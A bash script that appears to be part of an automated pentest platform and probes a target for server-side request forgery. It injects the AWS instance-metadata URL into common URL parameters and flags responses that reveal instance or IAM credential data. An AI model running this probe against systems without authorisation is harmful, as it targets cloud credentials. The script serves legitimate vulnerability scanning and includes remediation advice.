#!/usr/bin/env bash
# ============================================================================
# SentinelAI Autonomous Pentest Platform — Security PoC Probe
# Name:        SSRF Indicator Probe
# Description: Tests parameters that might fetch URLs server-side
# Severity:    HIGH
# Category:    Framework & API Security (Laravel, WordPress, Spring, GraphQL)
# Language:    bash
# ============================================================================

# Target argument handling: allow positional arg $1 or env var TARGET
TARGET="${1:-${TARGET:-}}"
SCAN_ID="${SCAN_ID:-standalone_poc_test}"
DEPTH="${DEPTH:-standard}"

if [ -z "$TARGET" ]; then
  echo -e "\033[1;31m[-] Error: Missing TARGET argument.\033[0m"
  echo -e "\033[1;33m[*] Usage:   $0 <target_url_or_ip>\033[0m"
  echo -e "\033[1;34m[*] Example: $0 https://example.com\033[0m"
  exit 1
fi

# Normalize URL: remove trailing slash
TARGET="${TARGET%/}"

echo -e "\033[1;36m[*] [SentinelAI PoC] Running probe: SSRF Indicator Probe\033[0m"
echo -e "\033[1;34m[*] Target: $TARGET\033[0m"
echo ""

# Standard emit handler for standalone terminal execution
emit() {
  echo -e "\033[1;32m[+] VULNERABILITY CONFIRMED / FINDING EMITTED:\033[0m"
  echo "$1" | python3 -m json.tool 2>/dev/null || echo "    $1"
}

# --- Core PoC Execution ---
emit() { printf '%s\n' "$1"; }
T="$TARGET"
PARAMS="url link img image fetch load source src proxy callback webhook preview render page site host domain dest redirect_to api endpoint feed rss"
# use a canary that would only appear if server fetched it
CANARY="http://169.254.169.254/latest/meta-data/"
for P in $PARAMS; do
  RESP=$(curl -s --max-time 12 "$T?$P=$CANARY" 2>/dev/null | head -c 3000)
  # AWS metadata response contains ami-id or instance-id
  if echo "$RESP" | grep -q "ami-id\|instance-id\|iam/security-credentials"; then
    emit "{\"title\":\"SSRF to cloud metadata: ?$P=\",\"severity\":\"critical\",\"description\":\"Parameter ?$P= fetches internal URLs. AWS metadata endpoint accessible — IAM credentials can be stolen.\",\"remediation\":\"Validate and allowlist URLs. Block requests to private IP ranges and metadata endpoints.\",\"cweId\":\"CWE-918\",\"owaspCategory\":\"A10:2025-Server-Side Request Forgery\"}"
    break
  fi
done

echo ""
echo -e "\033[1;34m[*] Probe execution complete.\033[0m"
